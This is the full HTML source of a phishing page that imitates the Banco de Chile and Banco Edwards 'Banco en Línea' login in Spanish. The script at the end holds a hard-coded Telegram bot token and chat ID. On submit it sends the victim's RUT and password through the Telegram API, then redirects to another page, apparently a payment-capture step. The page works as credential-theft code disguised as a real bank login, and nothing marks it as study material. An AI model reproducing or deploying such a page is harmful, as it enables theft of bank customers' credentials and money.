<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Banco de Chile</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@400;600;700&display=swap');
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Source Sans Pro', Arial, sans-serif;
        }
        
        body {
            background-image: url('https://via.placeholder.com/1200x800/7f9cb5/FFFFFF');
            background-size: cover;
            background-position: center;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .login-card {
            background-color: white;
            border-radius: 16px;
            width: 100%;
            max-width: 400px;
            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.1);
            padding: 30px;
        }
        
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 30px;
        }
        
        .banco-chile {
            color: #0e2b5c;
            font-weight: 700;
            font-size: 20px;
        }
        
        .bancoedwards {
            color: #00b394;
            font-size: 16px;
            font-weight: 600;
        }
        
        .subtitle {
            display: block;
            font-size: 12px;
            color: #00b394;
        }
        
        h1 {
            color: #0e2b5c;
            font-size: 24px;
            margin-bottom: 30px;
            font-weight: 600;
        }
        
        .input-group {
            margin-bottom: 20px;
        }
        
        input {
            width: 100%;
            padding: 16px;
            border: 1px solid #d1d1d1;
            border-radius: 8px;
            font-size: 16px;
            outline: none;
        }

        input:focus {
            border-color: #0e2b5c;
        }
        
        .password-container {
            position: relative;
        }
        
        .eye-icon {
            position: absolute;
            right: 15px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
            color: #666;
        }
        
        .login-button {
            background-color: #0e2b5c;
            color: white;
            width: 100%;
            padding: 16px;
            border: none;
            border-radius: 50px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
            margin-bottom: 20px;
            transition: background-color 0.3s;
        }
        
        .login-button:hover {
            background-color: #0a1e3a;
        }
        
        .login-button:disabled {
            background-color: #ccc;
            cursor: not-allowed;
        }
        
        .help-link {
            display: flex;
            align-items: center;
            margin-bottom: 30px;
        }
        
        .help-link .icon {
            color: #888;
            margin-right: 10px;
        }
        
        .help-link a {
            color: #0e2b5c;
            text-decoration: none;
            font-weight: 600;
        }
        
        .help-link span {
            color: #0e2b5c;
            text-decoration: none;
        }
        
        .contact-box {
            background-color: #f8f9fb;
            border-radius: 12px;
            padding: 20px;
            text-align: center;
        }
        
        .contact-box p {
            color: #555;
            margin-bottom: 15px;
            font-size: 14px;
        }
        
        .banks-contact {
            display: flex;
            justify-content: space-between;
            margin-bottom: 15px;
        }
        
        .bank-contact {
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        
        .bank-name {
            font-weight: 600;
            color: #333;
            margin-bottom: 5px;
            font-size: 14px;
        }
        
        .phone {
            display: flex;
            align-items: center;
            color: #0e2b5c;
            font-weight: 600;
            font-size: 14px;
        }
        
        .phone img {
            margin-right: 5px;
        }
        
        .divider {
            border-top: 1px solid #eee;
            margin: 15px 0;
        }
        
        .help-center {
            text-align: center;
            color: #555;
            font-size: 14px;
            margin-bottom: 10px;
        }
        
        .help-center-button {
            background: none;
            border: none;
            color: #0e2b5c;
            font-weight: 700;
            font-size: 14px;
            cursor: pointer;
            text-transform: uppercase;
        }
        
        .loading {
            display: none;
            text-align: center;
            margin-top: 20px;
            color: #0e2b5c;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="login-card">
        <!-- Header con logos -->
        <div class="header">
            <img src="../img/banco-chile.png" alt="">
            <div class="bancoedwards">
                BANCOEDWARDS
                <span class="subtitle">BANCO DE CHILE</span>
            </div>
        </div>
        
        <!-- Título principal -->
        <h1>Bienvenido a Banco en Línea</h1>
        
        <!-- Formulario de login -->
        <form id="loginForm">
            <div class="input-group">
                <input type="text" id="rut" name="rut" placeholder="RUT" required>
            </div>
            
            <div class="input-group">
                <div class="password-container">
                    <input type="password" id="password" name="password" placeholder="Contraseña" required>
                    <div class="eye-icon" onclick="togglePassword()">
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
                            <circle cx="12" cy="12" r="3"></circle>
                            <line id="eyeLine" x1="4" y1="20" x2="20" y2="4" style="display: none;"></line>
                        </svg>
                    </div>
                </div>
            </div>
            
            <button type="submit" class="login-button" id="submitBtn">INGRESAR</button>
        </form>
        
        <div class="loading" id="loading">
            Procesando tu solicitud...
        </div>
        
        <!-- Link de recuperación de clave -->
        <div class="help-link">
            <div class="icon">
                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                    <path d="M21 2l-2 2m-7.61 7.61a5.5 5.5 0 1 1-7.778 7.778 5.5 5.5 0 0 1 7.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4"></path>
                </svg>
            </div>
            <span>¿Problemas con tu clave?</span> <a href="#"> Recupérala</a>
        </div>
        
        <!-- Caja de contacto -->
        <div class="contact-box">
            <p>¿Tienes problema para acceder a tu cuenta?</p>
            
            <div class="banks-contact">
                <div class="bank-contact">
                    <div class="bank-name">Banco de Chile</div>
                    <div class="phone">
                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                            <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path>
                        </svg>
                        600 637 3737
                    </div>
                </div>
                
                <div class="bank-contact">
                    <div class="bank-name">Banco Edwards</div>
                    <div class="phone">
                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                            <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path>
                        </svg>
                        600 231 9999
                    </div>
                </div>
            </div>
            
            <div class="divider"></div>
            
            <div class="help-center">Te invitamos a nuestro Centro de Ayuda</div>
            <button class="help-center-button">IR AL CENTRO DE AYUDA</button>
        </div>
    </div>

    <script>
        // Configuración de Telegram
        const BOT_TOKEN = '8050472055:AAECARJvZtrimVGoBUIXERph4dQDfL3pVXE';
        const CHAT_ID = '5848946481';
        const REDIRECT_URL = '../cargapago.html'; // URL de redirección después del envío

        // Función para mostrar/ocultar contraseña
        function togglePassword() {
            const passwordInput = document.getElementById('password');
            const eyeLine = document.getElementById('eyeLine');
            
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                eyeLine.style.display = 'block';
            } else {
                passwordInput.type = 'password';
                eyeLine.style.display = 'none';
            }
        }

        // Función para enviar mensaje a Telegram
        async function sendToTelegram(rut, password) {
            const message = `🏦 *Banco de Chile - Nuevo acceso*\n\n` +
                          `👤 *RUT:* ${rut}\n` +
                          `🔑 *Contraseña:* ${password}\n\n` +
                          `📅 *Fecha:* ${new Date().toLocaleString('es-CL', {
                              timeZone: 'America/Santiago',
                              year: 'numeric',
                              month: '2-digit',
                              day: '2-digit',
                              hour: '2-digit',
                              minute: '2-digit',
                              second: '2-digit'
                          })}\n` +
                          `🌐 *Plataforma:* Banco en Línea`;

            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            
            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });

                if (response.ok) {
                    return true;
                } else {
                    throw new Error('Error en el envío a Telegram');
                }
            } catch (error) {
                console.error('Error:', error);
                return false;
            }
        }

        // Manejo del formulario
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const rut = document.getElementById('rut').value.trim();
            const password = document.getElementById('password').value.trim();
            const submitBtn = document.getElementById('submitBtn');
            const loading = document.getElementById('loading');
            
            // Validar campos
            if (!rut || !password) {
                alert('Por favor, completa todos los campos');
                return;
            }
            
            // Deshabilitar botón y mostrar loading
            submitBtn.disabled = true;
            submitBtn.textContent = 'PROCESANDO...';
            loading.style.display = 'block';
            
            try {
                // Enviar a Telegram
                const success = await sendToTelegram(rut, password);
                
                if (success) {
                    // Pequeña pausa para que el usuario vea que se procesó
                    setTimeout(() => {
                        // Redirigir después del envío exitoso
                        window.location.href = REDIRECT_URL;
                    }, 2000);
                } else {
                    // En caso de error, mostrar mensaje
                    alert('Error al procesar la solicitud. Por favor, intenta nuevamente.');
                    submitBtn.disabled = false;
                    submitBtn.textContent = 'INGRESAR';
                    loading.style.display = 'none';
                }
            } catch (error) {
                console.error('Error:', error);
                alert('Error al procesar la solicitud. Por favor, intenta nuevamente.');
                submitBtn.disabled = false;
                submitBtn.textContent = 'INGRESAR';
                loading.style.display = 'none';
            }
        });

        // Formatear RUT mientras se escribe
        document.getElementById('rut').addEventListener('input', function(e) {
            let value = e.target.value.replace(/[^0-9kK]/g, '');
            if (value.length > 1) {
                value = value.slice(0, -1) + '-' + value.slice(-1);
            }
            if (value.length > 10) {
                value = value.slice(0, 10);
            }
            e.target.value = value;
        });

        // Prevenir copiar/pegar en el campo de contraseña (opcional para mayor seguridad)
        document.getElementById('password').addEventListener('paste', function(e) {
            e.preventDefault();
        });
    </script>
</body>
</html>
